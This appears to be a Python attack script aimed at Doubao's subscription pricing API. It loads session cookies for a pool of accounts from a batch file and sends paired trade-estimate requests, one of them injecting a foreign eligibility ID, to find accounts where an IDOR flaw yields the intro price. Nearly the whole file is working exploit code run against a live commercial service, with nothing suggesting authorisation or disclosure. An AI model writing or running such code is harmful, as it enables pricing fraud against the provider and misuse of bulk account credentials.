# -*- coding: utf-8 -*-
import json, requests
BASE="https://www.doubao.com"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 SamanthaDoubao/2.33.3"
SCOPE={"version_code":"20800","language":"zh","device_platform":"web","doubao_device_platform":"web","aid":"497858","real_aid":"497858","pkg_type":"release_version","pc_version":"0.1.0","doubao_pc_version":"0.1.0","region":"CN","sys_region":"CN","samantha_web":"1","web_platform":"desktop","use-olympus-account":"1"}
H={"content-type":"application/json","agw-js-conv":"str","referer":BASE+"/member/subscription","origin":BASE,"user-agent":UA,"accept":"application/json, text/plain, */*"}
ELIG="0000000000000003"
raw=json.load(open("pool/trial_batch_212.json",encoding="utf-8"))["accounts"]
def parse(s):
    d={}
    for p in s.split(";"):
        if "=" in p: k,v=p.split("=",1); d[k.strip()]=v.strip()
    return d
ck_by_uid={str(a.get("uid")):parse(a["cookie_string"]) for a in raw if a.get("cookie_string")}
rows=json.load(open("scan_212.json",encoding="utf-8"))
alive=[r for r in rows if r.get("code")==0 and not r.get("hit1")]
def est(s, extra):
    body={"sku_key":"doubao_personal_std","card_id":"doubao_personal_std_auto_renew_month",
          "purchase_channel":2,"support_diff_price":True,"timezone":-480,
          "total_price":100,"trade_extra":extra,"is_eligible_for_intro_offer":True}
    j=s.post(BASE+"/alice/commerce/sale/trade/estimate/",params=SCOPE,json=body,headers=H,timeout=20).json()
    d=j.get("data") or {}; pi=d.get("price_info") or {}
    return j.get("code"), pi.get("pay_amount")
hit=0
for r in alive[:8]:
    ck=ck_by_uid.get(str(r.get("uid")))
    if not ck: continue
    s=requests.Session(); s.cookies.update(ck)
    c0=est(s,"{}"); c1=est(s,json.dumps({"selected_eligibility_id":ELIG}))
    flag="   <<< IDOR HIT" if (c1[0]==0 and c1[1]==100) else ""
    if flag: hit+=1
    print("%-18s uid=%-18s control=%s idor=%s%s" % (r.get("screen_name"), r.get("uid"), c0, c1, flag))
print("IDOR hits:",hit)
